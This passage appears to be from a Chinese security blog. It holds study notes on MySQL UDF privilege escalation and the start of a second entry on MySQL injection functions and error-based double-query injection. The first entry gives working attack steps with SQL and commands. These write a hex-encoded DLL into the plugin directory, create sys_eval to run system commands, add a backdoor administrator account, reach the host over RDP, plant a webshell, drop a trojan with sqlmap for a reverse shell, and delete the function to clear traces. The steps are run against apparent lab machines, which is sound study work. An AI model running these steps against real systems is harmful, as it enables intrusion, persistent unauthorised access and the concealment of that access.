        <content type="html"><![CDATA[<hr><h2 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h2><p>**UDF (user defined function)**，即用户<a href="https://so.csdn.net/so/search?q=%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0">自定义函数</a>。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。</p><p>那么，我们该如何使用UDF呢？</p><p>假设我的<a href="https://so.csdn.net/so/search?q=UDF">UDF</a>文件名为 udf.dll，存放在MySQL安装目录的 lib/plugin 目录下(当MySQL&gt;5.1，该目录默认不存在)。</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>在 udf.dll 文件中，我定义了名为 sys_eval() 的 MySQL 函数，该函数可以执行系统任意命令。但是如果我现在就打开 MySQL 命令行，使用 select sys_eval(‘whoami’)；的话，系统会返回 sys_eval() 函数未定义。因为我们仅仅是把 udf.dll 放到了 lib/plugin 目录下，并没有引入。类似于面向对象编程时引入包一样，如果没有引入包，那么这个包里的类你是用不了的。<br>所以，我们应该把 udf.dll 中的自定义函数引入进来。看一下官方文档中的语法：</p><p>实例用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>只有两个变量:</p><ul><li>一个是 function_name（函数名），我们想引入的函数是 sys_eval。</li><li>还有一个变量是 shared_library_name（共享包名称），即 udf.dll 。</li></ul><p>至此我们已经引入了 sys_eval 函数，下面就可以使用了。<br>这个函数用于执行系统命令，用法如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> mysql.func where name = <span class="string">&#x27;sys_eval&#x27;</span>;    <span class="comment">#查看创建的sys_eval函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);                           <span class="comment">#使用系统命令</span></span><br></pre></td></tr></table></figure><ul><li>当 MySQL&lt; 5.1 版本时，将 .dll 文件导入到 c:\windows 或者 c:\windows\system32 目录下。</li><li>当 MySQL&gt; 5.1 版本时，将 .dll 文件导入到 MySQL Server 5.xx\lib\plugin 目录下 (lib\plugin目录默认不存在，需自行创建)。</li></ul><h3 id="UDF提权步骤"><a href="#UDF提权步骤" class="headerlink" title="UDF提权步骤"></a>UDF提权步骤</h3><p><strong>一：查看 secure_file_priv  的值</strong></p><p>secure_file_priv 是用来限制 load dumpfile、into outfile、load_file() 函数在哪个目录下拥有上传或者读取文件的权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     当 secure_file_priv 的值为 <span class="keyword">NULL</span> ，表示限制 mysqld 不允许导入<span class="operator">|</span>导出，此时无法提权</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     当 secure_file_priv 的值为 <span class="operator">/</span>tmp<span class="operator">/</span> ，表示限制 mysqld 的导入<span class="operator">|</span>导出只能发生在 <span class="operator">/</span>tmp<span class="operator">/</span> 目录下，此时也无法提权</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入<span class="operator">|</span>导出做限制，此时可提权</span><br></pre></td></tr></table></figure><p>我们先查看 secure_file_priv 的值是否为空，因为只有为空我们才能继续下面的提权步骤。</p><ul><li>如果 secure_file_priv 为NULL是不能写入导出文件的。</li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419191.png" alt="img"></p><ul><li>如果 secure_file_priv没有具体的值，则可以写入导出文件。</li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419202.png" alt="img"></p><ul><li> secure_file_priv 的值在MySQL数据库的安装目录的 my.ini 文件中配置。</li></ul><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419203.png" alt="img"></p><p><strong>二：查看plugin的值</strong></p><p>但是实际测试发现UDF提权成功与否与该值无关。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> Host,<span class="keyword">user</span>,plugin <span class="keyword">from</span> mysql.user <span class="keyword">where</span> <span class="keyword">user</span> <span class="operator">=</span> substring_index(<span class="keyword">user</span>(),<span class="string">&#x27;@&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        当 plugin 的值为空时不可提权</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        当 plugin 值为 mysql_native_password 时可通过账户连接提权</span><br></pre></td></tr></table></figure><p><img src="20190922232744345.png" alt="img"></p><p><strong>三：查看系统架构以及plugin目录</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%compile%&#x27;</span>;             <span class="comment">#查看主机版本及架构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show variables like <span class="string">&#x27;plugin%&#x27;</span>;               <span class="comment">#查看 plugin 目录</span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419204.png" alt="img"></p><p>这里是 x64 位的系统，我们可以去kali中 /usr/share/metasploit-framework/data/exploits/mysql/ 目录下载64位的 .dll 文件。(由于我这里MSF更改过，所以路径有所不同)</p><p><img src="20190922233138843.png" alt="img"></p><p><strong>四：将dll文件写入plugin目录,并且创建函数</strong></p><p>创建一个表并将二进制数据插入到十六进制编码流中。你可以通过insert语句或将其分解为多个部分，然后通过update语句拼接二进制数据。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> temp(data longblob);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> temp(data) <span class="keyword">values</span> (<span class="number">0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update temp <span class="keyword">set</span> data <span class="operator">=</span> concat(data,<span class="number">0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a383b369f112b376a383b35269636877a383b300000000000000000000000000000000504500006486060070b1834b00000000</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> data <span class="keyword">from</span> temp <span class="keyword">into</span> dumpfile &quot;G:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\lib\\plugin\\udf.dll&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname <span class="string">&#x27;udf.dll&#x27;</span>;   #创建函数sys_eval</span><br></pre></td></tr></table></figure><p>执行select data from temp into dumpfile “G:\phpstudy_pro\Extensions\MySQL5.7.26\lib\plugin\udf.dll”; 时有可能会出现以下错误，因为当MySQL大于5.1时，默认是没有 lib\plugin 目录的。而 into dumpfile在写入文件时也不能创建文件夹，所以也就报错了：Can’t create/write to file </p><p><img src="%7Bfilename%7D/20200421141437925.png" alt="img"></p><p>而在执行 create function sys_eval returns string soname ‘udf.dll’; 命令时出现 1126 - Can’t open shared library ‘udf.dll’的错误。我看网上有的解释是说是因为在MySQL安装目录下默认没有 lib\plugin 目录导致的。但是我不认为是这个错误，因为如果上一步将dll文件写到 lib\plugin 目录没报错的话，说明dll文件已经写到 lib\plugin 目录了，因此也就不存在这个错误。但是目前还没有找到解决版本。</p><p><img src="20200421144731571.png" alt="img"></p><p><strong>五：使用系统命令</strong></p><p>在将 udf.dll 文件写入plugin目录后，我们就可以使用 sys_eval 函数了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> mysql.func where name = <span class="string">&#x27;sys_eval&#x27;</span>;    <span class="comment">#查看创建的sys_eval函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select sys_eval(<span class="string">&#x27;whoami&#x27;</span>);                           <span class="comment">#使用系统命令</span></span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419205.png" alt="img"></h3><p>如果得到了数据库的用户名和密码，并且可以远程连接的话，可以使用MSF里面的 <strong>exploit/multi/mysql/mysql_udf_payload</strong> 模块自动注入。</p><h3 id="使用MSF进行UDF提权"><a href="#使用MSF进行UDF提权" class="headerlink" title="使用MSF进行UDF提权"></a>使用MSF进行UDF提权</h3><p>使用MSF中的 exploit/multi/mysql/mysql_udf_payload 模块也可以进行UDF提权。MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，如果该目录不存在的话，则无法执行成功)，dll文件名为任意创建的名字。该dll文件中包含sys_exec()和sys_eval()两个函数，但是默认只创建sys_exec()函数，该函数执行并不会有回显。我们可以手动创建 sys_eval() 函数，来执行有回显的命令。</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419216.png" alt="img"></p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419217.png" alt="img"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> mysql.func <span class="keyword">where</span> name = <span class="string">&quot;sys_exec&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419218.png" alt="img"></p><p>手动使用该 dll 文件创建sys_eval()函数，来执行有命令的回显。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> sys_eval <span class="keyword">returns</span> string soname &quot;XJhSEGuE.dll&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sys_eval(&quot;whoami&quot;);</span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-16414510419219.png" alt="img"></p><h3 id="UDF提权复现-php环境"><a href="#UDF提权复现-php环境" class="headerlink" title="UDF提权复现(php环境)"></a>UDF提权复现(php环境)</h3><blockquote><p>靶机环境：Windows Server 2003 、php 5.4.3 、 Apache2.4.23</p></blockquote><p>这里我们已经通过上传一句话木马拿到网站的shell了，并且得到了网站数据库的用户名和密码都是root。但是因为获得的系统用户权限太低，无法创建新用户。而且也不能使用其他提权等手段。所以，我们现在要做的就是使用UDF进行提权。</p><p>首先，我们把 phpspy.php 和　udf.php 两个文件上传到网站服务器</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192110.png" alt="img"></p><p>然后先访问 phpspy.php 页面，MySQL Manager——&gt;输入数据库的密码——&gt;选择一个数据库</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192111.png" alt="img"></p><p>由于MySQL&gt;5.2版本后，在其安装目录的lib目录下没有 plugin 目录，所以，我们得新建这个目录，并且将我们的 udf.dll 文件放入 plugin目录下，我们执行下面命令，完成创建plugin目录，并且将udf.dll放入该目录下</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#x27;xxxxxx&#x27; into dumpfile &#x27;<span class="type">C</span>:\\<span class="type">Program</span>\ <span class="type">Files</span>\\<span class="type">MySQL</span>\\<span class="type">MySQL</span>\ <span class="type">Server</span>\ <span class="number">5.4</span>\\lib\\plugin::<span class="variable">$INDEX_ALLOCATION</span>&#x27;</span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192112.png" alt="img"></p><p>然后我们访问 udf.php 页面，并且用数据库的账户名和密码登录。这是登录后的页面</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192113.png" alt="img"></p><p>然后我们点击 Dump UDF ，提示Dump DLL Success ！</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192214.png" alt="img"></p><p>然后我们点击 Create Function，下面就会有 select shell(‘cmd’,’whoami’) ，然后我们点击 Mysql_query ，下面就会有whoami命令的执行结果</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192215.png" alt="img"></p><p>我们可以把命令换成 net user  hack 123 /add ，新建一个用户，可以看到成功了！然后我们接下来吧hack用户添加到administrators管理员组内，就可以远程登录了！</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192216.png" alt="img"></p><h3 id="UDF提权后如何反弹shell"><a href="#UDF提权后如何反弹shell" class="headerlink" title="UDF提权后如何反弹shell"></a>UDF提权后如何反弹shell</h3><p>当UDF提权后，我们想反弹一个MSF或者CS的shell。</p><p>首先使用CS的Powershell反弹命令是不行的，这里由于powershell命令引号过多，不能执行。</p><p>我们现在的思路是执行木马文件，反弹shell。这里由于sys_eval函数不能执行windows那些远程下载命令，所以我们选择通过sqlmap的写入文件功能，将木马写入当前目录。</p><p>首先，查看当前目录</p><p><img src="20200508093222666.png" alt="img"></p><p>然后sqlmap写入木马。这里本来是准备远程下载的，但是发现 certutil 和 bitsadmin 执行都发生错误，有可能是这个机器的问题。</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.10.130/?id=2&quot;</span> --file-<span class="keyword">write</span> msf.exe --file-dest <span class="string">&quot;C:\phpStudy\PHPTutorial\MySQL\data\hack.exe&quot;</span></span><br></pre></td></tr></table></figure><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192217.png" alt="img"></p><p>执行木马反弹。这里需要注意的是，sys_eval函数只能执行当前目录下的文件，所以，也只能把文件写入当前路径下。</p><p><img src="watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70-164145104192218.png" alt="img"></p><h5 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h5><ul><li>攻击机：win7</li><li>靶机：win2003</li></ul><h5 id="复现流程："><a href="#复现流程：" class="headerlink" title="复现流程："></a>复现流程：</h5><p>在靶机写入一句话木马并用蚁剑连接</p><p><img src="2135181-20210114175334168-1416049087.png" alt="img"></p><p>webshell.php内容：</p><p><img src="2135181-20210114175345927-637623635.png" alt="img"></p><p>通过蚁剑连接webshell</p><p><img src="2135181-20210114175357818-594772486.png" alt="img"></p><p>通过蚁剑的数据操作功能连接该网站的mysql数据库</p><p><img src="2135181-20210114175454660-11236029.png" alt="img"></p><p>连接数据库后我们需要先查看数据库的位数与版本，看看数据库是32位还是64位，数据库是&gt;=5.1还是&lt;5.1，以此来选择不同的dll文件与不同的路径放置dll文件。在这里我们使用show variables like ‘%version_%’查看数据库位数</p><p><img src="2135181-20210114175510521-1519228066.png" alt="img"></p><p>可以看到当前数据库的位数是32位</p><p>再使用select version();查看数据库版本</p><p><img src="2135181-20210114175520685-2134055789.png" alt="img"></p><p>可以看到数据库版本为5.5.53&gt;5.1所以我们的udf文件应该放置到mysql目录下的lib/plugin目录中。其中plugin目录是不存在的，我们需要自己建立一个plugin的目录。</p><p>此时我们就需要找到提权所需的udf.dll文件。该文件可以在sqlmap中找到，这些udf文件存放在sqlmap的sqlmap\data\udf\mysql\windows目录，该目录下有32和64两个文件夹，分别对应不同mysql位数的dll文件，因为这里的mysql是32位，所以我们选择32位的udf文件来进行提权。使用udf提权前需要利用sqlmap自带的解码工具cloak.py，进入到 sqlmap\extra\cloak 目录下，执行命令：python2 cloak.py -d -i D:\Penetration\sqlmap\data\udf\mysql\windows\32\lib_mysqludf_sys.dll_</p><p>解码后会在sqlmap\data\udf\mysql\windows\32文件夹下生成 dll 文件。在 mysql 安装路径下的 lib 文件夹内创建 plugin 目录，上传 lib_mysqludf_sys.dll。</p><p><img src="2135181-20210114175531230-464593682.png" alt="img"></p><p>此时udf文件已经上传至mysql目录下的/lib/plugin目录，接下来我们就要声明该文件中所定义的函数并使用它了。在这里我们使用的是sys_eval()函数</p><p>首先使用create function sys_eval returns string soname “lib_mysqludf_sys.dll”来声明sys_eval()函数</p><p><img src="2135181-20210114175548883-225163623.png" alt="img"></p><p>可以看到已经导入成功，紧接着使用select * from mysql.func where name = ‘sys_eval’;查看是否导入成功或者重复导入</p><p><img src="2135181-20210114175609476-763876625.png" alt="img"></p><p>可以看到sys_eval已经导入成功，这时我们就可以使用sys_eval执行系统命令了。</p><p>首先我们使用select sys_eval(‘net user Yhck 123456 /add ‘);命令添加一个名为Yhck的用户</p><p><img src="2135181-20210114175620493-1270981025.png" alt="img"></p><p>可以看到命令执行成功。</p><p>再执行select sys_eval(‘net localgroup administrators Yhck /add’);命令将Yhck用户添加进管理员组进行提权</p><p><img src="2135181-20210114175633836-961781637.png" alt="img"></p><p>可以看到提权成功。</p><p>使用select sys_eval(‘netstat -ano | findstr 3389’);命令查看3389端口是否开启</p><p><img src="2135181-20210114175706717-1276150049.png" alt="img"></p><p>可以看到3389端口已经开启。</p><p>启用mstsc.exe连接靶机的3389端口，使用Yhck 123456进行登录</p><p><img src="2135181-20210114175715354-1812883034.png" alt="img"></p><p>连接成功</p><p>连接成功后使用</p><ul><li>drop function sys_eval;</li><li>delete from mysql.func where name=’sys_eval’;</li></ul><p>这两条命令删除所创建的自定义函数，清除痕迹</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql注入一些点的总结</title>
      <link href="/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/"/>
      <url>/2022/01/06/mysql%E6%B3%A8%E5%85%A5%E4%B8%80%E4%BA%9B%E7%82%B9%E7%9A%84%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h1><p>sql注入过程中需要用到一些函数来完成测试过程。</p><ul><li>mid()函数<br><code>mid(column_name,start[,length])</code><br>这个函数作用是从指定字段中提取出字段的内容。<br><code>column_name：</code>字段名<br><code>start：</code>开始位置<br><code>length:</code>长度<br>例子：</li></ul><p><img src="webp.webp" alt="img"></p><p><img src="webp-16414367160921.webp" alt="img"></p><p><img src="webp-16414367160922.webp" alt="img"></p><ul><li><p>limit()</p><p>返回结果中的前几条数据或者中间的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM TABLE LIMIT M,N;</span><br></pre></td></tr></table></figure><p>m是指记录开始的index，从0开始，表示第一条记录。</p><p>n是指从第m+1条开始，取n条。</p><p><img src="webp-16414367160923.webp" alt="img"></p></li><li><p>concat()、concat_ws()、group_concat()<br>concat()函数可以连接一个或者多个字符串<br><code>concat(str1,str2,str3,....)</code><br>返回结果为连接参数产生的字符串，但是如果其中一个参数为NULL ，则返回值为 NULL。</p></li></ul><p><img src="webp-16414367160924.webp" alt="img"><br>concat_ws()<br><code>concat_ws()(separator,str1,str2,...)</code><br>第一个参数是分隔符，</p><p><img src="webp-16414367160935.webp" alt="img"><br>group_concat()<br>分组拼接函数<br><code>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator &#39;分隔符&#39;])</code></p><p><img src="webp-16414367160936.webp" alt="img"></p><ul><li><p>Count() 聚集函数，统计元祖个数</p><p><img src="webp-16414367160937.webp" alt="img"></p></li><li><p>rand() 产生一个0~1的随机数</p></li></ul><p><img src="webp-16414367160938.webp" alt="img"></p><ul><li><p>floor() 向下取整</p><p><img src="webp-16414367160939.webp" alt="img"></p></li><li><p>group by 根据想要的规则对结果进行分组</p></li></ul><p><img src="webp-164143671609310.webp" alt="img"></p><ul><li>Substr() 截取字符串<br><code>substr(a,b,c)</code><br>a 所要截取字符串<br>b 截取的位置<br>c 截取的长度</li></ul><p><img src="webp-164143671609311.webp" alt="img"></p><ul><li>Ascii() 返回字符串的ascii码</li></ul><p><img src="webp-164143671609312.webp" alt="img"></p><ul><li>Left()函数<br><code>left(string,num)</code> 得到字符串最左边指定个数的字符</li></ul><p><img src="webp-164143671609313.webp" alt="img"></p><p><img src="webp-164143671609314.webp" alt="img"></p><ul><li>ORD()函数，此函数为返回第一个字符的ASCII码，可以和上面的函数进行组合使用。<br><code>ORD(MID(DATABASE(),1,1))&gt;119</code> –&gt;检测database()的第一位ASCII码是否大于119，也即是‘r’</li></ul><p><img src="webp-164143671609315.webp" alt="img"></p><p><img src="%7Bwebp-164143671609416.webp" alt="img"></p><p>这两种方法都可以把数据库的名字猜出来。</p><h1 id="报错。"><a href="#报错。" class="headerlink" title="报错。"></a>报错。</h1><p>双查询注入</p><p><strong>什么是双查询注入呢？</strong><a href="https://blog.csdn.net/lixiangminghate/article/details/80466257">https://blog.csdn.net/lixiangminghate/article/details/80466257</a></p><p>看大佬的解释太深奥，粗俗的理解就是一个select语句里再嵌套一个select语句，将有用的信息显示在SQL的报错信息。</p><p>首先,理解四个函数/语句：<strong>Concat(),Rand(), Floor(), Count(),Group by clause</strong></p><p>①concat()函数</p><p>我理解为组合，汇合函数将括号里的符号连接在一起。</p><p><img src="a8986c9be71521c07ed04b31cae2f5c6.png" alt="a8986c9be71521c07ed04b31cae2f5c6.png"></p><p>将结果连在了一起。</p><p><img src="4cbac94e27d91bb14ab00cec939a7d82.png" alt="4cbac94e27d91bb14ab00cec939a7d82.png"></p><p>②Rand函数</p><p>用来返回一个01之间的随机数，区间表示就是【0,1)。括号里为空时，随机产生数。</p><p><img src="9ceb6271323ae3ede1ad262f4c4b57a9.png" alt="9ceb6271323ae3ede1ad262f4c4b57a9.png"></p><p>当括号里的参数固定时，随机数(随机数列)也是固定的。</p><p><img src="dee6f116a60b0803b24e2428f55c2cd8.png" alt="dee6f116a60b0803b24e2428f55c2cd8.png"></p><p>让我们看一下随机数列</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">rand</span>(<span class="params"><span class="number">3</span></span>) <span class="keyword">from</span> information_schema.columns limit 3</span>;</span><br></pre></td></tr></table></figure><p>产生三列随机数。</p><p><img src="1cb4d441fbacdd8b7490262073eeb572.png" alt="1cb4d441fbacdd8b7490262073eeb572.png"></p><p>对比一下还是不变。</p><p>③Floor()函数</p><p>Floor()函数时取整函数，当输入一个非整数，返回小于等于输入参数的最大整数。</p><p><img src="9af296b7db716c4d8e85d1a61fa92c3a.png" alt="9af296b7db716c4d8e85d1a61fa92c3a.png"></p><p>④count()函数</p><p>用于统计行数。</p><p><img src="5f47fef24e85130e6333b85ec103fb02.png" alt="5f47fef24e85130e6333b85ec103fb02.png"></p><p>⑤group by 语句</p><p>先看这句：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, table_name <span class="keyword">from</span> information_schema.tables；</span><br></pre></td></tr></table></figure><p><img src="077b7ec7cac8262ea9f028f9df5f5a7a.png" alt="077b7ec7cac8262ea9f028f9df5f5a7a.png"></p><p>加上group by语句后：</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">by</span> table_schema；</span><br></pre></td></tr></table></figure><p><img src="6c02cf042dafa816aaa6dfcf84be040f.png" alt="6c02cf042dafa816aaa6dfcf84be040f.png"></p><p>加上之后，数据明显少了很多的重复的。重复的数据库只显示一个，并且只显示数据库里的第一张表。</p><p>几个函数灵活运用，会有什么不异想不到的结果呢？</p><p>我们实践一下</p><p>①rand()函数和floor()函数结合使用。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">floor</span>(<span class="params">rand(<span class="number">5</span></span>)*12) <span class="keyword">from</span> information_schema.columns limit 5</span>;</span><br></pre></td></tr></table></figure><p><img src="10a41ecde27375f4a254ce8a6817381e.png" alt="10a41ecde27375f4a254ce8a6817381e.png"></p><p>由内到外逐个分析，rand(5)会随机产生5个不同的值，但是*12，就是将【0，1)扩大到【0，12)，floor函数就是取整了。</p><p>②count()函数和group by语句</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema, count(*) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> table_schema;</span><br></pre></td></tr></table></figure><p><img src="1290d0d11e360a9478b2013628c51cbb.png" 